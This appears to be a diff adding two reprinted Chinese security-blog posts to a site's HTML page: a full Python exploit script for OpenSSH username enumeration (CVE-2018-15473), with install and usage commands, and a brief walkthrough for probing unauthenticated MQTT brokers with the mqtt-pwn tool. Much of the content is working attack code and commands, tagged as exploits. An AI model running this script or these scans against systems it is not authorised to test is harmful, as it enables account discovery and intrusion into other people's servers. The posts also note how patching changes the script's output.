@@ -87,6 +87,91 @@
 
     
         <h2 class="title">
+            <a href="/2024/01/19/CVE-2018-15473-OpenSSH/">
+                OpenSSH用户名枚举及其检测方法（CVE-2018-15473）
+            </a>
+        </h2>
+    
+    <time>
+        Jan 19, 2024
+    </time>
+    <section class="content">
+        <h1><span id="openssh用户名枚举及其检测方法cve-2018-15473">OpenSSH用户名枚举及其检测方法（CVE-2018-15473）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/726a3791b5b9">testerzhang</a> 并作补充</p>
+<p>OpenSSH 7.7前在接收到畸形的认证请求包时，会根据用户名的存在与否给出不同的响应，由此导致通过SSH服务枚举服务器的用户名。</p>
+</blockquote>
+<h3><span id="ssh-check-usernamepy-使用说明">ssh-check-username.py 使用说明</span></h3><blockquote>
+<ul>
+<li>安装依赖包 <code>pip install paramiko==2.0.8</code></li>
+<li>语法：<code>python ssh_checkusername.py ip username –port 22</code></li>
+</ul>
+</blockquote>
+<h3><span id="脚本">脚本</span></h3><blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright (c) 2018 Matthew Daley</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Permission is hereby granted, free of charge, to any person obtaining a copy</span></span><br><span class="line"><span class="comment"># of this software and associated documentation files (the &quot;Software&quot;), to</span></span><br><span class="line"><span class="comment"># deal in the Software without restriction, including without limitation the</span></span><br><span class="line"><span class="comment"># rights to use, copy, modify, merge, publish, distribute, sublicense, and/or</span></span><br><span class="line"><span class="comment"># sell copies of the Software, and to permit persons to whom the Software is</span></span><br><span class="line"><span class="comment"># furnished to do so, subject to the following conditions:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The above copyright notice and this permission notice shall be included in</span></span><br><span class="line"><span class="comment"># all copies or substantial portions of the Software.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span></span><br><span class="line"><span class="comment"># IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span></span><br><span class="line"><span class="comment"># FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span></span><br><span class="line"><span class="comment"># AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span></span><br><span class="line"><span class="comment"># LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING</span></span><br><span class="line"><span class="comment"># FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS</span></span><br><span class="line"><span class="comment"># IN THE SOFTWARE.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InvalidUsername</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_boolean</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[</span><br><span class="line">        paramiko.common.MSG_SERVICE_ACCEPT]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service_accept</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    paramiko.message.Message.add_boolean = add_boolean</span><br><span class="line">    <span class="keyword">return</span> old_service_accept(*args, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">userauth_failure</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">raise</span> InvalidUsername()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">paramiko.auth_handler.AuthHandler._handler_table.update(&#123;</span><br><span class="line">    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,</span><br><span class="line">    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">&#x27;paramiko.transport&#x27;</span>).addHandler(logging.NullHandler())</span><br><span class="line"></span><br><span class="line">arg_parser = argparse.ArgumentParser()</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;hostname&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">22</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;username&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">args = arg_parser.parse_args()</span><br><span class="line"></span><br><span class="line">sock = socket.socket()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sock.connect((args.hostname, args.port))</span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[-] Failed to connect&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">transport = paramiko.transport.Transport(sock)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    transport.start_client()</span><br><span class="line"><span class="keyword">except</span> paramiko.ssh_exception.SSHException:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[-] Failed to negotiate SSH transport&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    transport.auth_publickey(args.username, paramiko.RSAKey.generate(<span class="number">2048</span>))</span><br><span class="line"><span class="keyword">except</span> InvalidUsername:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*] Invalid username&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">except</span> paramiko.ssh_exception.AuthenticationException:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Valid username&#x27;</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="验证说明">验证说明：</span></h2><blockquote>
+<p>如果服务器存在的用户，则脚本会返回<code>Valid username</code></p>
+<p>如果服务器不存在的用户，则脚本会返回<code>Invalid username</code><br> 如果升级ssh版本之后：</p>
+<p>如果服务器存在的用户，则脚本会返回<code>Valid username</code></p>
+<p>如果服务器不存在的用户，则脚本会返回<code>Valid username</code></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/OpenSSH/" rel="tag">OpenSSH</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/19/MQTT-Pwd/">
+                MQTT未授权漏洞利用
+            </a>
+        </h2>
+    
+    <time>
+        Jan 19, 2024
+    </time>
+    <section class="content">
+        <h1><span id="mqtt未授权漏洞利用">MQTT未授权漏洞利用</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/suyu7/p/15290972.html">唐小风</a> 并作补充</p>
+</blockquote>
+<h3><span id="1-扫描端口">1、扫描端口</span></h3><blockquote>
+<p><img src="/2024/01/19/MQTT-Pwd/1.png" alt="image"></p>
+</blockquote>
+<h3><span id="2-mqtt-pwd安装">2、mqtt-pwd安装</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/akamai-threat-research/mqtt-pwn.git</span><br><span class="line"><span class="built_in">cd</span> mqtt-pwd</span><br><span class="line">docker-compose up --build --detach</span><br><span class="line">docker-compose run cli</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">discovery</span><br><span class="line">scans</span><br><span class="line">scans -i 1</span><br><span class="line">topics</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/MQTT-Pwd/2.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/MQTT/" rel="tag">MQTT</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2024/01/19/Webshell-Bypass/">
                 一些webshell免杀的技巧
             </a>
